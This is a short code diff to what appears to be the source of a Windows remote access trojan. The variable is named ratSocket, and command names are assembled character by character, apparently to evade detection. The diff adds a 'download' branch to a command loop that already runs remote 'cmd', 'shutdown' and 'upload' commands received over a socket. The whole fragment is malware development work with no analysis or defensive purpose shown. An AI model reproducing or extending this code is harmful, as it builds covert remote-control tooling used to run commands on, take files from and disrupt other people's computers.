@@ -232,6 +232,7 @@ WinMain(HINSTANCE hInstance,
 		char ca_cmd[] = { 'c','m','d',0 };
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
 		char ca_upload[] = { 'u','p','l','o','a','d',0 };
+		char ca_download[] = { 'd','o','w','n','l','o','a','d',0 };
 
 		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = {};
 		SplitString(recvBuffer, splittedCommand, " ");
@@ -283,6 +284,16 @@ WinMain(HINSTANCE hInstance,
 		else if ( strcmp(splittedCommand[0], ca_upload) == 0 )
 		{
 			SocketUploadFile(&ratSocket, splittedCommand[1]);
+		}
+		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
+		{
+			char writeBuffer[SOCKET_BUFFER_SIZE];
+			if ( f_recv(ratSocket.socketConnection, writeBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
+			{
+				OutputDebugStringA("Error receiving message.");
+			}
+			OutputDebugStringA("Received download: ");
+			OutputDebugStringA(writeBuffer);
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
